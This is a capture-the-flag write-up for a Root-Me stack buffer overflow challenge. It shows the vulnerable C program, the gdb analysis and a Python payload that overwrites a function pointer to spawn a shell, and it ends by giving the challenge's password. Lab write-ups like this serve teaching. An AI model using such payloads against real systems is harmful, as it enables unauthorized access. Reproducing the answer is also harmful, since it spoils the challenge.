# ELF x86 - Stack buffer overflow basic 2
- Point: 10pts
- Author: [Lyes](https://www.root-me.org/Lyes?lang=en), 10 April 2015
- Level: Very Easy
- Statement
- Environment configuration <br>
```
  PIE	    Position Independent Executable	 ✘ 
  RelRO	    Read Only relocations	         ✘ 
  NX	    Non-Executable Stack	         ✔ 
  Heap exec Non-Executable Heap	                 ✔ 
  ASLR	    Address Space Layout Randomization	 ✘ 
  SF	    Source Fortification	         ✘ 
  SSP	    Stack-Smashing Protection            ✘
  SRC	    Source code access	                 ✔ 
```
## Write-up:
Code:
```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
 
void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}
 
void main()
{
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```
## Write-up:
- As a normal code flow, the program will point to the address of **sup()** function and execute it. So we need to override the "ret addr" and point it to **shell()** function. - Using gdb and disassembler the **main()** function:<br>
![image](https://user-images.githubusercontent.com/48288606/141277701-1e1e1c08-997a-47ba-be6a-1129505aee79.png)
 
- Poke around and find the **shell()**'s address at **0x08048516**:<br>
![image](https://user-images.githubusercontent.com/48288606/141276299-ec52a57d-f7cb-48de-a655-2862d97402c3.png)
- Let's try filling with 128 arbitrary bytes and the address of **sup()** function at **0x08048559**
```
app-systeme-ch15@challenge02:~$ python -c "print('a'*128+'\x59\x85\x04\x08')" | ./ch15
Hey dude ! Waaaaazzaaaaaaaa ?!
Segmentation fault
```
We can access to that address and carry out the code
### Solution:
- First we will fill the **buf**'s value with 128 "A" characters, and then push the address of the **shell()** function. <br>
Payload: `(python -c "print('a'*128+'\x16\x85\x04\x08')";cat) | ./ch15` <br>
Password: B33r1sSoG0oD4y0urBr4iN

